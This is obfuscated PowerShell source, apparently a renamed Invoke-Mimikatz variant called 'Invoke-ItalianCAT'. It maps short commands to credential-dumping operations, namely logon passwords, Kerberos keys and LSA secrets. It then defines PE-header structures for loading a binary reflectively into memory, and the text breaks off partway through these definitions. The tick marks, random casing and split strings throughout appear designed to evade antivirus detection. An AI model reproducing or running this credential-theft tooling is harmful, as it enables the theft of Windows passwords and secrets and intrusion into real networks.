function invOKE-ItalIanCAT {

    [CmdletBinding(  DeFAulTParAMEtErsETnAME = {'Def' +  'ault'} )]
    Param( 

        [Parameter(parAMEtErsetNaMe  =   "D`eF`AuLT", pOSitIOn  =   0  )]
        [String]
        ${Co`M`MAND}
    )


    Set-Alias no NeW-ObJEct
    Set-Alias aM adD-mEMBeR

    if (${cOM`MAnD} -eq ( 'dum' + 'p'  )) { ${Com`ma`Nd}   =  ( ( '{0}' + 'token:'  + ':eleva' +'te{0} {0}seku'  +  'r' +  'lsa' +  ':'  +  ':lo' +  'go'  + 'n' +  'pas'+ 'swords' + '{0}' ) -f  [ChaR]34) }
    elseif ( ${com`Ma`Nd} -eq ('ekey' +  's'  ) ) { ${C`O`MMAnD}   = ( ('v' + 'C7'+'to'+'ke'  + 'n::e' +'l'+ 'evat'+ 'evC7 vC7se'+ 'kurl'+ 'sa::' +  'ek' +'eysvC7' )-CRepLaCe  ([chAr]118  +[chAr]67+ [chAr]55),[chAr]34 ) }
    elseif ( ${Co`mMAnd} -eq (  'l'  +  'sa')  ) { ${CoMm`A`Nd}  =  (  ('{'+  '0}tok'+ 'en:' + ':e' +'leva' +  't' +  'e' + '{' +'0} {0}l'  + 'sadump::'+  'secre'+  'ts{0}'  )  -F  [chaR]34 ) }

    Set-StrictMode -Version 2


    ${rSb`Lk}   =  {
        [CmdletBinding(  )]
        Param( 
            [Parameter(poSition =   0, MandatorY =   ${tr`UE}  )]
            [String]
            ${P`NeBiT`ES`64},
		
            [Parameter( poSITiON  = 1, mANDatORY  =  ${F`ALsE} )]
            [String]
            ${F`RT},
				
            [Parameter( poSition   =  2, maNDatoRy  = ${Fa`LsE}  )]
            [Int32]
            ${PO`K`ID},
		
            [Parameter(PosiTIoN =  3, maNDAtorY =  ${fA`lSe} )]
            [String]
            ${p`oN},

            [Parameter(  pOsItiOn =  4, MANDATOrY   =  ${faL`sE} )]
            [String]
            ${C`O`MMandar`GUMEn`Ts}
        )
	
		
		
		
        Function Gw32t {
${W`32T}  =   nO sysTEM.oBJeCt

${Do`main} =   [AppDomain]::"cU`RRENTD`OMAIN"
${d`ADa} =  nO REFlEctIoN.ASSeMBlYnAme(  'Re'+(  'f' +  'le'  ) +(  'ct'  +  'e')+'dD'  +'el'+ ('eg' +  'a'  )+'te')
${lON`sh}   = ${D`oMAIn}."dEFinedyNAm`I`cAsse`MBLY"(${d`AdA}, [System.Reflection.Emit.AssemblyBuilderAccess]::"r`Un")
${mb`er} =  ${L`o`NsH}."d`EF`InEDYNA`mIcMOdU`LE"(  (  'Dynam' +'icM'  +  'od'  + 'ule' ), ${fa`LSE} )
${c`I} =  [System.Runtime.InteropServices.MarshalAsAttribute]."geTC`OnS`TrUCTO`Rs"( )[0]

${t`B} =   ${M`Ber}."D`eFi`NeeNUm"((  'M' +'ach'  + 'ineTyp'  +  'e'  ), (  'Publi'+ 'c'  ), [UInt16]  )
${nu`Ll}  =   ${tB}."DeF`IN`ELITeR`Al"($((  'Na'+'t'  ) + (  'iv'+ 'e') ), [UInt16]0  )
${Nu`Ll}  =   ${T`B}."dEFINE`lI`Te`RAl"( $('I3'  + '86'  ), [UInt16]0x014c )
${N`ULl}  =  ${t`B}."dEFIn`E`LIteRAL"( $(('I' + 'ta')  +  ('n' +'iu')  +  'm'  ), [UInt16]0x0200)
${N`ULL}  =  ${tB}."deFI`N`e`LItERaL"($('x6' +  '4'), [UInt16]0x8664)
${mT}   = ${Tb}."CReA`TeT`YpE"(  )
${w`32t} |   aM -MemberType $('No'  +'te'  +  'P'+ 'r'+ 'op' +  'e' +  'r' +'ty' ) -Name $((  'M'  +'ac')  +  ( 'hi'+'n' )+ (  'eT'  +  'yp' ) +'e' ) -Value ${MT}

${Tb}  =   ${MB`Er}."De`FiNEen`UM"((  'MagicTy'  +'pe'), (  'Publ'  +  'ic'  ), [UInt16])
${N`ULl} =   ${tb}."DEfiNe`L`ITerAl"((  'I' +'MAGE_N'+  'T_OP'  + 'TIONAL'  + '_H'+'DR32'  + '_M'  + 'AGIC'), [UInt16]0x10b  )
${NU`LL}   =  ${tb}."deFi`NElI`TErAl"( (  'IMAG'+'E_NT_'  +  'O'+'PTI'+ 'ONAL_'+ 'HDR64'+'_MAGIC' ), [UInt16]0x20b)
${mag`iCt`YpE} =   ${tb}."cRe`A`T`ETyPe"(   )
${w`32t}  |  aM -MemberType $('No'+ 'te'+'P' +  'r' + 'op'  +  'e'+  'r' + 'ty'  ) -Name $(( 'Ma' +  'g' )  + 'ic'  +('Ty' +'p'  )  +  'e'  ) -Value ${m`AG`iC`TYpe}

${Tb}   =   ${mb`eR}."de`FInEe`NuM"( ( 'Sub' +  'Syst'+  'e'+'mType' ), ('Pu'+  'bli'+ 'c'), [UInt16]  )
${n`UlL} =   ${t`B}."Def`ineli`T`e`RAL"( $('IM'  +  'AG'  + 'E_'+ ('SU'+'B' ) +  'SY' +  'ST' + ( 'EM'  +'_' ) +'UN' + 'KN' +'OW' + 'N'  ), [UInt16]0 )
${n`ULl}   =   ${TB}."dE`F`InELIte`Ral"(  $('IM'+'AG'  +'E_'+(  'S'  + 'UB' ) +'SY'  + 'ST'+ ( 'E' +  'M_' )+ 'NA' +  'TI' +'VE'  ), [UInt16]1)
${nU`ll}   = ${tB}."DEFiNELI`Te`RAl"(  $('IM' + 'AG'  +'E_' +( 'SU' +  'B') + 'SY'+'ST'+( 'EM'+  '_'  ) + 'WI' +'ND' +'OW'  +'S_' +  'GU'  +'I'  ), [UInt16]2  )
${N`ULl}  = ${T`B}."DeFi`NeLiTEr`AL"( $('IM'+ 'AG' +  'E_'  +('S' +  'UB') + 'SY' +  'ST'+(  'E' + 'M_') + 'WI' + 'ND'+'OW' + 'S_'  +'CU' +'I'), [UInt16]3)
${nU`LL}  = ${t`B}."deFiNe`liT`eRAl"($('IM'+  'AG'+  'E_'  + ( 'S'+  'UB' )+  'SY'+'ST' +  ( 'EM'  + '_' ) + 'PO'  +  'SI'+  'X_'  +'CU' +  'I' ), [UInt16]7)
${Nu`lL}  =  ${t`B}."DEf`I`N`e`liTerAl"( $('IM'  +  'AG' +  'E_'  + ('SU' +'B') + 'SY'  + 'ST'  + ('E' +'M_' ) + 'WI'+ 'ND' + 'OW'  + 'S_'  + (  'C' +  'E_'  )  + 'GU'+'I' ), [UInt16]9  )
${N`ULL}  =  ${Tb}."dE`FI`NelI`TerAL"($('IM'+'AG' +'E_'+(  'S' +  'UB' )  + 'SY'+ 'ST' +  ('EM'  +  '_' )  +  'EF'+'I_'+  'AP'+ 'PL' + 'IC'+'AT' +  'IO'+'N' ), [UInt16]10  )
${Nu`ll} =  ${Tb}."de`FInELi`T`e`Ral"(  $('IM'+ 'AG'+ 'E_'+(  'SU'+  'B'  ) + 'SY'+ 'ST'  + (  'EM' +  '_'  )+ 'EF'+  'I_'+ 'BO'  + 'OT'  + '_'  +'SE'+ 'RV'+ 'IC' +'E_'  + 'DR'  +'IV' +  'ER' ), [UInt16]11 )
${nU`ll}  =   ${tb}."def`I`NeliTeR`AL"( $('IM' + 'AG'  + 'E_'  +  ('S'+  'UB')+  'SY'  + 'ST'+(  'EM' +  '_')  +'EF'  +'I_'  +  'RU'+  'NT' +'IM'+ 'E_' + 'DR' + 'IV'  +  'ER' ), [UInt16]12 )
${n`UlL}   =   ${T`B}."dE`FI`NEliTEraL"($('IM'  +  'AG' + 'E_'+('S'+  'UB'  )  + 'SY'+'ST' +  ('EM' + '_'  )+'EF'  +'I_' +  'RO'+'M'), [UInt16]13 )
${Nu`Ll} =   ${T`B}."dEfI`N`EliTERaL"(  $('IM'+ 'AG'+'E_'  +(  'SU' + 'B'  ) +'SY'  + 'ST'  +('E'+ 'M_' )  +  'XB'  +'OX'  ), [UInt16]14)

${S`Ub`SYsteMT`YPe}   =   ${Tb}."CREatet`y`pe"(   )
${W`32t}  |  aM -MemberType $('No'  +'te' + 'P'  +'r'+'op' +'e'+  'r'+  'ty') -Name $((  'Su'  +'b') +'Sy' +'st'  +  'em'  +  (  'T'+  'yp' )+ 'e'  ) -Value ${su`BSy`ST`emtYpe}

${tb} =  ${M`Ber}."DEfin`e`enuM"( ( 'DllCh'+  'ar'  +  'ac' +  't'  +'er' + 'isticsT'+  'ype'), ( 'P'  +'ubl'  +'ic'), [UInt16]  )
${N`Ull} =  ${t`B}."DeFinEL`It`ERal"(  ('RE'+ 'S_0'), [UInt16]0x0001  )
${N`Ull}  =  ${tb}."De`FinElIT`eR`AL"(('RES'  +  '_1'), [UInt16]0x0002 )
${nU`lL} =   ${tb}."d`Efine`lITERAl"(( 'RES_'  +  '2' ), [UInt16]0x0004 )
${NU`ll}   = ${Tb}."deF`iNEL`iTEraL"( ( 'RE'  + 'S_3' ), [UInt16]0x0008)
${nu`lL}   =  ${tB}."deFINEl`I`TERaL"( $('IM' +  'AG'  +  'E_' + 'DL' +  'L_'+'CH'  + 'AR'+ 'AC' +  'TE'+  'RI' +  'ST'  +'IC' +  'S_'+ 'DY'  +  'NA' + 'MI' +'C_'  +'BA'  + 'SE'  ), [UInt16]0x0040 )
${nU`Ll}  = ${tB}."dEFInE`LiTEr`AL"(  $('IM'  +  'AG'  +'E_'+'DL'+  'L_' +'CH'  +  'AR'+ 'AC'  +  'TE' +  'RI'+  'ST' +'IC'+  'S_'+  'FO'+'RC'+  'E_' +'IN'  +'TE'  +'GR'+ 'IT'+  'Y'), [UInt16]0x0080  )
${NU`Ll} = ${TB}."DeF`iNEL`i`TerAl"($('IM' +  'AG' + 'E_' +  'DL'  +  'L_' + 'CH'  + 'AR' + 'AC'+ 'TE'+ 'RI'+ 'ST'+'IC'+ 'S_'+  'NX'  +'_'  +  'CO' +  'MP'  + 'AT' ), [UInt16]0x0100 )
${N`UlL}   =  ${t`B}."DE`FiNe`LItERaL"( $('IM' +'AG'  +  'E_' +'DL'+'L'+'CH' +'AR'  + 'AC'+ 'TE' +  'RI'  + 'ST'+ 'IC'  + 'S_' +'NO' +'_'  +  'IS'  +'OL'+'AT'  +  'IO'+ 'N'), [UInt16]0x0200 )
${nU`Ll} =   ${t`B}."DEfiN`ElitER`Al"(  $('IM' +  'AG'+'E_'+ 'DL'  + 'L' +'CH' + 'AR'  +'AC' +'TE'+  'RI' +  'ST'+  'IC' + 'S_' +  'NO'+ '_'  +'SE'+  'H' ), [UInt16]0x0400 )
${Nu`ll}  =  ${tB}."de`FiNEl`I`TERAl"($('IM'+'AG' + 'E_' +  'DL'  +  'L'+  'CH'+  'AR' + 'AC'+ 'TE' +'RI'+ 'ST'+ 'IC'  + 'S_'+  'NO'+ '_'+ 'BI'+  'ND' ), [UInt16]0x0800 )
${nu`ll} =  ${t`B}."DEFI`N`E`lI`TERal"( ('RES_'+'4' ), [UInt16]0x1000)
${Nu`Ll}  = ${t`B}."D`eFINE`lITERal"($('IM' +  'AG'+ 'E_'  +  'DL'  +  'L' +'CH'  +'AR' +  'AC'+'TE'+  'RI'+  'ST' +  'IC'  +'S_'  + 'WD'+ 'M_' +  'DR'  + 'IV'  + 'ER'), [UInt16]0x2000  )
${n`ULL}   =   ${t`B}."D`E`FIne`LITErAl"( $('IM'  +'AG'+'E_' +  'DL'  + 'L'  +  'CH' +'AR'+'AC'+ 'TE' +'RI'+  'ST'  +  'IC'+'S_'+ 'TE'  +  'RM' + 'IN'+(  'A'  +'L_')  +'SE' + 'RV'  +  (  'ER' + '_' )+'AW'+ 'AR'+'E'  ), [UInt16]0x8000  )
${lF`MM`MSG}  =  ${TB}."crEa`T`eTypE"(    )
${W3`2T}   | aM -MemberType $('No' +'te' +  'P'+'r'+'op'  + 'e' +'r' +  'ty' ) -Name $((  'Dl' + 'l') +  'Ch' +'ar' + ( 'ac'  + 't' ) + ('e'+'ri' )+  (  'st'+'i') +  'cs'+  (  'Ty' +'p'  )  +'e') -Value ${Lf`M`mMSg}

${A`TR} =  $(( 'Aut'  + 'o'  )  +  ( 'Layo'  +'ut'  )+  ', ' +  ( 'An'+  'si')+  (  'Cl'+  'ass' )+ ', ' + ( 'C'+ 'lass' )+', ' +  ( 'Publi'+  'c' ) +  ', ' +  ('Expli'+  'cit')+('Layou' +'t')+ ', '+('Seal'  +'ed') +', '  +  ( 'Bef' + 'ore' )  + ( 'F'  +  'ield') +( 'I'  +'nit'))
${tb}   = ${MB`er}."DEfi`NE`TypE"('IM'+(  'AGE' +  '_'  ) +('DAT'  +  'A_')+ ('DIRE'  +'CT'  ) +('OR'  +  'Y' ), ${a`TR}, [System.ValueType], 8)
${nu`Ll}  =  (  ${tB}."def`in`E`FIEld"(  (  'V'+'irtu' )  +  (  'alA' +  'dd'  +  'r' +  'ess'  ), [UInt32], (  'P' +  'ublic' )))."Seto`F`FSEt"(  0  )
${n`ULl}  =  (${tB}."DE`F`In`eFieLD"( ('Si'+  'ze'), [UInt32], ( 'Publi'+'c')  ) )."s`EtOfFSet"( 4  )
${I`IMG}   =  ${tB}."CrEa`Tet`YPE"(  )
${W`32T}   | aM -MemberType $('No'  + 'te'  + 'P' + 'r'  +  'op'  +'e'  + 'r'+'ty'  ) -Name $('IM'  +'AG'  +'E_'+ 'DA' +  (  'TA' +  '_')+'DI' +  'RE'+  'CT' +'OR' + 'Y' ) -Value ${i`IMg}

${A`TR}   =   $(( 'Au' +  'to'  )+ (  'Lay'  +  'o' +  'ut')+ ', ' +  ( 'An'  +'si'  )+(  'Clas' +'s' )+  ', ' + (  'C'  +'lass')+  ', '+(  'P'+  'ublic'  )  + ', ' +  ( 'S' +  'eq'  +'uential')+ ('Layo'+'ut')+  ', ' + ( 'Se'  +'aled')  +  ', ' +  (  'B'+ 'efore' )+( 'F' +'ield'  ) + (  'Ini' +  't'  )  )
${Tb}  =  ${MB`Er}."d`E`FInetYpE"((  'IM'  + 'AGE') +( '_F'+'I'  )  + ( 'L'+ 'E_') +('HE'+ 'AD') +  'ER', ${A`Tr}, [System.ValueType], 20 )
${n`Ull}  =   ${T`B}."D`efInEfI`eLd"( 'Ma'+('c'+ 'hi'  )  +  'ne', [UInt16], ( 'P' +  'ubl'  +'ic')  )
${nu`Ll} =   ${T`B}."d`e`FINEfIeLD"(  ('N'+  'um'  )+ (  'be' + 'r' )  +  (  'O' +  'fS'  )  + (  'e'+ 'ct' +'ions'  ), [UInt16], (  'Pu'  +  'bli'+'c' ) )
${N`UlL} =  ${Tb}."deF`ineFiE`LD"(( 'Ti'+ 'me' )  + ('Dat'  +  'e' )+(  'S'+  'tamp' ), [UInt32], ( 'P'+'ubli'+'c')  )
${N`Ull}   = ${tb}."DeFIN`E`FIElD"( ( 'Poin'+  'ter'  )+'To'  +(  'Sym' + 'bol'  ) +  ('Ta' +  'ble' ), [UInt32], (  'P'+  'ublic'  )  )
${nU`ll}  =  ${Tb}."Def`in`EFIelD"(  ('N' + 'umber')  +('O'+ 'fSym' )+  ( 'bol'  + 's'  ), [UInt32], (  'P'+ 'u' + 'blic')  )
${nU`ll}  = ${tB}."dE`FINeFi`e`ld"(  (  'S' +'ize')  +  ('Of' +'Opt'  )  +  ( 'io'+ 'nal' ) +('He'+ 'a' +  'der'  ), [UInt16], (  'Pub'+  'lic'  ) )
${nu`LL}  = ${tB}."dEFiNe`F`i`Eld"(( 'Cha'+ 'r')+(  'act'  +  'er')+('isti' +'cs'), [UInt16], ( 'Publi'+'c'  ) )
${P`EL`Xv}  =   ${t`B}."cRe`AtET`YPE"( )
${W3`2t} |  aM -MemberType $('No'  +'te' +'P' + 'r'  + 'op'+ 'e'  + 'r' +  'ty' ) -Name $('IM'  + 'AG'+ 'E_'+  'FI'  +(  'LE'+'_')+'HE' +'AD' +  'ER' ) -Value ${Pel`Xv}


${a`TR}  = $(('A'+ 'uto')  +('Layo' +  'ut' ) + ', '+  ( 'A'  +'nsi'  )+ ( 'Cl'+  'ass' ) +', ' +( 'Cla' +'ss')  +', ' + ( 'Pu'+ 'blic'  )  +', '+ (  'Expl' + 'ic'  +'it'  ) + ('Layou' + 't' ) +  ', '  +(  'Seale'  + 'd'  )  +', ' +  (  'Be'+  'fore'  )  +(  'Fi'+  'eld') +  ( 'I'  + 'nit') )
${TB} =  ${mB`er}."DEF`iNeTY`PE"('IM'+ ( 'AG' + 'E'  ) +(  '_O'+ 'PT'  )  + (  'IO'  + 'NAL'  )  +  (  '_HE' + 'AD'  ) +'ER' + '64', ${A`Tr}, [System.ValueType], 240)

${N`ULL}  = (${tb}."dE`FiN`efI`eLd"(  'Ma'  +'g'+  'ic', ${ma`GI`CTy`pE}, ( 'Pub'+'l'  +'ic')  ))."SE`T`OfFSet"( 0)
${Nu`LL} = (  ${T`B}."dE`F`InEfiELD"( 'Ma'+(  'jo'  +  'r')+ (  'L' +  'in')  +  ('ke'+'r' )+( 'V'+ 'er') + (  'sio'  + 'n'), [Byte], (  'Publi'  +'c'  )) )."seto`FF`set"( 2  )
${N`ULL} =  ( ${tb}."DEFi`NeFI`E`Ld"( 'Mi'  +  ( 'no' + 'r' ) +  (  'Li'+ 'n')+(  'ke'+'r')  +('V'  +'er' )+ ( 's' + 'ion' ), [Byte], ('Pu'+ 'blic')  )  )."seT`o`FfsET"(3 )
${n`ULL} =   (  ${t`B}."d`Ef`IneFIeld"( 'Si'+  'ze'  +  'Of' + 'Co'+  'de', [UInt32], ('Publi' +'c' ) ))."s`eTOffs`et"(4 )
${NU`ll} =   ( ${T`B}."defIN`eFI`elD"('Si'+ 'ze'+'Of'  +  (  'I'+ 'ni'  ) +('t' + 'ia') +  (  'li'  + 'zed')  +  'Da'  + 'ta', [UInt32], (  'P'  + 'ubl'  +  'ic'  )  ))."se`TofF`set"(8  )
${N`ULl}  = ( ${TB}."dEF`i`NEFIe`Ld"(  'Si'+ 'ze'  +'Of' +'Un'  +('in'+  'i'  ) +( 't'+ 'ia')+  ('lize'+'d'  )+  'Da'  +  'ta', [UInt32], (  'P'  +'ub'  +'lic')  )  )."s`Et`OF`FseT"( 12)
${n`ULL}  =  (  ${Tb}."DEf`iNEfI`Eld"( 'Ad'  + ( 'dr' +'ess' ) + 'Of'  +  ( 'E'  +  'nt'  ) +'ry' +  ('Po'+'int'), [UInt32], ( 'Pub'+  'li'+'c')  ))."Se`Tof`F`SET"( 16 )
${N`ULL}   =  (  ${t`B}."d`efiN`eFieLd"('Ba'+'se'+  'Of' +'Co' +'de', [UInt32], ('Publi' + 'c' ) )  )."SeT`O`FfSEt"(  20)
${Nu`LL} =  (  ${TB}."d`e`FINeFiELD"(  'Im' + (  'ag'  +'e'  ) +  ('B'  +'ase'  ), [UInt64], (  'Pub'  + 'lic') ))."SE`TOFf`seT"(  24 )
${Nu`LL}  =  (${t`B}."de`F`inEf`Ield"(('Se'+  'c'  ) + ('tio' +'n'  ) + 'Al'+  ( 'ig'  + 'n' )+(  'me'+ 'nt' ), [UInt32], (  'Pub' +'li' +  'c'  ) ))."SEto`F`F`SET"(  32 )
${nu`Ll}  =   ( ${tb}."DefiN`efie`ld"(( 'F'  +  'ile')+'Al'+ ( 'ig' +'n'  )  +  ( 'm'  +  'ent'  ), [UInt32], ( 'Pub' +'lic'  ) ) )."se`TO`FFSeT"( 36)
${nU`Ll}   =   (  ${t`B}."DeFI`Ne`FIeLd"( 'Ma'  +  ( 'j' +'or'  )+  'Op'+ 'er'  +  ( 'a' +  'ting' ) +('S' + 'ys'  ) +( 't'  +  'em')  +  ('V' +'er' )  + ('si'  + 'on'  ), [UInt16], (  'Publ'+ 'i' +'c' )  ))."SE`To`FfSeT"(40  )
${n`UlL} = ( ${Tb}."de`FiNe`F`ielD"('Mi' + ('n'+  'or'  ) +  'Op'+'er'+(  'at' +'ing') + ( 'S'  +  'ys')  + ( 'te'  + 'm' )  +  (  'Ve' + 'r'  )  + ( 's'+'ion' ), [UInt16], ( 'Pub'  +  'l'  +  'ic' )  ) )."SEToF`F`sEt"(42  )
${n`Ull}   =   (  ${t`B}."DE`Fi`NeFIE`Ld"('Ma'+  (  'j'+'or')+  'Im'+  (  'a'  +  'ge' ) + ('V' + 'er') +(  'sio' +'n'  ), [UInt16], ('Pub'+ 'li'+ 'c'  )  ) )."S`Eto`FFS`eT"( 44)
${n`UlL} =   ( ${T`B}."DEf`IN`EfIeLd"('Mi'+ (  'no'+ 'r') +  'Im'  +  (  'a' + 'ge' )+ ('V'  + 'er'  )  + ('si' +  'on' ), [UInt16], (  'Publ'+  'i'  +  'c')  )  )."S`Etoffs`eT"(  46 )

${Nu`ll} =  ( ${tb}."dE`FiNeF`IelD"( 'Ma'+(  'j' +'or'  )+  ( 'Su' + 'b'  ) +  ('s'+  'yste'+  'm') + ('V'  +'er'  )+( 'si' +  'on' ), [UInt16], ( 'Pub' +'lic'))  )."sEtO`FFseT"(48)
${Nu`Ll}  = ( ${TB}."dEfinE`F`ield"('Mi'+  ('n' +'or' )  +  ( 'S'  + 'ub'  ) +  ('syste'+'m')+('Ve' + 'r'  )  +  ( 's'  + 'ion' ), [UInt16], ( 'P'+'ublic' )) )."sE`TOF`F`SET"(  50  )
${nu`LL}  =  (  ${t`B}."d`eFIn`eFi`ElD"( ( 'W'+'in'  )  +  '32' +  ('Ve'  + 'rsio'+  'n' ) +  ( 'Valu'+  'e'  ), [UInt32], ('P'+  'ubli'+'c'  )  ) )."SetO`F`FS`Et"(52 )
${nu`LL} =  (  ${tb}."DEfI`NEf`I`eLd"(  ('Si'+'ze' )  +  'Of'  + ( 'Imag'  +'e' ), [UInt32], ( 'Publ'+'i'  + 'c' )  ) )."SE`T`oFFsEt"( 56)
${N`ULl}   = (${tB}."De`FI`NefiE`Ld"( ('Si'  + 'ze'  ) +'Of'+  ('Hea'  +'der'+'s'  ), [UInt32], ( 'Publi'+'c' ) )  )."SetofF`s`Et"(  60 )
${nu`lL}   = (${T`B}."DefI`N`efIEld"(  ( 'Che' +'ck'  )  + ('Su' + 'm'), [UInt32], ('Pu'+ 'blic'  )  )  )."SEtOF`F`Set"(  64  )
${n`ULL} =   (  ${T`B}."De`FiNef`IeLD"((  'S'  +  'ub' )+ ('sys'  +  'te' +  'm' ), ${sU`B`sYSTemtY`Pe}, (  'P'+  'ubl' +'ic' )  ))."s`et`OFFsEt"(68)
${N`Ull}   = ( ${tb}."dE`FInef`IE`lD"(( 'Dl'+  'l'  )  +(  'C'  + 'harac'  + 'ter' )+( 'ist'+  'ic' +  's'  ), ${Lf`mmmSg}, (  'Pu'+  'bli' +  'c' )  ) )."sEtOF`F`set"(70  )
${nU`Ll} = (${tB}."defIN`EF`ie`LD"(( 'Siz'  +'e' ) + 'Of'+  ('S' +'tack')  +( 'Rese'  + 'rv' +'e'  ), [UInt64], ( 'Pu' +  'bli'+ 'c'  )))."sET`oF`FS`ET"(  72 )
${nU`LL}  =   ( ${t`B}."DEFinEf`i`E`lD"( (  'S' + 'ize' )  +  'Of'+('Sta' +  'ck')+  ( 'C' +  'ommit'  ), [UInt64], (  'P' +'ub' + 'lic'  ) ))."s`eTOFF`SET"(  80 )
${Nu`ll} =   (  ${TB}."dEFi`NefI`E`LD"(('S'+'ize')  +'Of'  +  ( 'H'+ 'eap'  )+  ('Re'+'serve' ), [UInt64], (  'Pu'  +  'blic')  ) )."sETo`F`FsEt"(88 )
${NU`LL}  = (  ${tb}."dE`FInefI`Eld"( ( 'Siz' +'e')+ 'Of'+('Hea'+  'p' )  +  (  'C'  +  'ommit'  ), [UInt64], ('Publi'+  'c'  )  ) )."s`e`T`oFfSEt"( 96  )
${N`ULl}   =  (  ${Tb}."deFiNe`F`ielD"(  (  'Lo' +'a'  + 'der') + (  'Flag'+  's'), [UInt32], (  'Publi'+ 'c' )  )  )."s`ET`offSEt"(104  )
${NU`lL}   =   ( ${T`B}."deFIN`EFI`ELD"(('N'+ 'um'+'ber' )  +'Of'  +  ('Rv'  +  'a')+ (  'An' +  'd' )+  ('Si' + 'zes'), [UInt32], (  'Pu'  + 'bl' + 'ic')  ))."SE`T`O`Ffset"(  108 )
${Nu`Ll}  =  ( ${TB}."d`eFinef`IeLD"(  (  'Expo'  + 'rt') +  (  'Tabl' + 'e' ), ${ii`mG}, ( 'Pu'+  'bl'+ 'ic' )) )."SETo`FfsET"(  112  )
${nu`lL} =  (${tB}."DEFiNEf`iE`Ld"(  'Im'+  ( 'p'+  'ort')+( 'Tabl'+  'e'), ${I`img}, (  'Pu'  + 'b'+  'lic'  ) )  )."sE`TofFSeT"( 120 )
${n`UlL}   = (${TB}."D`eFI`NEFI`elD"( 'Re' +  ('s'+ 'ou' +'rce') +('Ta' + 'ble' ), ${ii`mG}, (  'Publi' + 'c') )  )."S`EtoffsET"( 128 )
${n`ULl} =  (  ${tB}."defI`NeFie`LD"(  'Ex' +( 'ce'+'ptio'  +'n' )+ ( 'Tab' +'le' ), ${I`ImG}, ('Publ' +  'i'  +'c'))  )."SeT`oF`FSet"(136 )
${NU`LL}   =  (${TB}."De`FI`NEFi`ELD"(  (  'Ce' + 'r' ) +( 't' +'ifi'+'cate'  ) + ( 'Ta' +  'ble'), ${i`iMG}, ( 'P'  +  'ubli'  + 'c'  ) ))."sE`ToFFS`et"( 144)
${N`Ull}  =   (  ${TB}."D`e`F`INEFIeld"( ( 'Bas'  + 'e')  + (  'Re'+  'loc' +  'ati'+  'on'  )  + (  'Tabl'  + 'e' ), ${ii`Mg}, (  'Publ'+  'ic'  ) ))."SETOfF`sET"(152)
${Nu`lL} =  (  ${T`B}."DE`FI`NeFie`LD"('De' +  (  'bu' + 'g'  ), ${i`IMG}, (  'Pu'  +  'blic' )  ) )."S`EtOFFs`Et"(160 )
${n`ULL}  =  ( ${t`B}."DEFi`NeFi`eLd"( 'Ar'+  (  'chit'  +'ec'  + 'tur' +'e'  ), ${ii`MG}, ('Publ' + 'ic'  )) )."s`etof`FSEt"(168 )
${n`UlL}   =   ( ${tB}."DEfIN`E`FI`eld"( ( 'G'+ 'lo') +('b' +'al' )  +  (  'P'+'tr'), ${i`Img}, (  'Pu'  +'bli'+  'c' )  ) )."Set`o`FFSET"(176)
${Nu`ll}  = ( ${T`B}."Def`I`NEfie`lD"(  ( 'TL' +  'S'  )+('Ta'+ 'ble' ), ${i`IMG}, (  'Pu'+'blic'  )))."SeTOF`FSeT"( 184 )
${N`Ull} =  ( ${tB}."defI`N`EFiElD"((  'Lo'+'ad')  +  ( 'Co' + 'nfig'  ) +  ('T'+  'able' ), ${i`Img}, ('Publ'  +  'ic'  )  )  )."se`T`OffsEt"( 192  )
${Nu`LL}   =  ( ${tB}."DE`FInEf`ielD"( ('Boun'  +'d' )  + ('Imp'+ 'o'  +  'rt'), ${iI`Mg}, ('P'+ 'ublic') ))."S`eTOf`FSet"( 200  )
${Nu`Ll}   =   ( ${Tb}."DefiN`eFie`lD"(  (  'I' + 'AT'  ), ${I`IMg}, (  'P' +'ublic' ) ) )."SetOFf`s`eT"(  208 )
${Nu`Ll} = ( ${Tb}."dE`FInE`FiE`lD"(  ( 'Dela'+  'y')  +  ('Im'+  'port')  +(  'De'  + 'sc'+  'riptor' ), ${ii`MG}, (  'Publi'+ 'c'  )  ))."sEtO`Ffs`Et"(216)
${n`ULL} =   (  ${Tb}."DEfine`F`iE`Ld"(  ( 'C'  +  'LR'  ) +  ( 'Ru' +  'ntime'  )+  ('Heade' +'r'), ${II`Mg}, ('Publi'  +'c' )  ))."sE`To`FFs`et"(224  )
${nu`lL} =   (  ${t`B}."Defi`NEFI`eLD"('Re'+ ('s' +  'erved' ), ${iI`Mg}, ('Pu'  +  'blic'  ) ))."SE`T`OfFSet"(232  )


            ${i`I`Imbc}  =  ${tB}."cRea`T`Ety`pE"(    )
            ${w3`2t} |  aM -MemberType $('No'+  'te'  +  'P' +'r' +'op'  +  'e' + 'r' +  'ty'  ) -Name $('IM' +'AG'+'E_'  + 'OP'+( 'T'  +'IO' )  +'NA' +  'L_'  +'HE' +'AD'+(  'ER6'  +  '4')) -Value ${ii`im`Bc}

${A`Tr} =   $((  'A'+'uto' ) +( 'Layo'  +  'ut' ) +  ', '+  (  'An'  +'si'  )  + (  'Cla' +'ss') + ', ' +('C'+'lass' )+ ', '+('Publi'+'c' ) +  ', ' +('Expl'  +  'i'  +'cit'  )  + (  'La'  + 'yo'+'ut'  )  +  ', ' +('Seal'  +  'ed')  +  ', '  +  ( 'B' +'ef'+ 'ore' )  +('Fiel' + 'd' )  +  ('In' +'it'  )  )
${tb}  =  ${m`BER}."DE`FINeT`YPE"(  'I' +  'M'+'A'+  'G'  +'E'+'_O'+'P'+ 'T'+'I'  +  'O'+  'N'+  'A'  +'L'+'_H'+ 'E'  + 'A' +  'D' +'E'+'R' +'32', ${A`Tr}, [System.ValueType], 224  )

${N`Ull} = (${t`B}."DE`Fin`EFiElD"('M' + 'a'+'g' + 'i'  +  'c', ${M`AgI`cTY`pE}, (  'Pu'+  'blic' ))  )."SE`T`oFfsET"( 0  )
${N`Ull} =  (${Tb}."DEF`InefiE`lD"('M' +  'a'+'j'  +'o'+  'r' + 'L'  +  'i'+  'n'+'k'+ 'e'  + 'r'  +  'V' +  'e' +  'r' +'s' +'i'  + 'o' +  'n', [Byte], ('Publ'  +'i'+  'c'  ))  )."s`eto`FfSEt"(2 )
${n`ULl} =   (${T`B}."dEF`i`N`EfIeLD"( 'M' + 'i' +  'n'+  'o'+  'r'  + 'L' + 'i' +  'n'+ 'k' +  'e'+ 'r'  + 'V'+'e' +  'r'+'s'+  'i'  +  'o'+ 'n', [Byte], ( 'Pub' +'lic' )) )."sEtO`Ff`s`et"(  3  )
${nu`ll} = ( ${tb}."deF`I`NefIe`ld"(  'S' + 'i' + 'z' +'e' +'O'+'f' + 'C'+  'o'  +'d'+  'e', [UInt32], ( 'Pub'+  'l' + 'ic')))."S`EtoF`FsEt"( 4  )
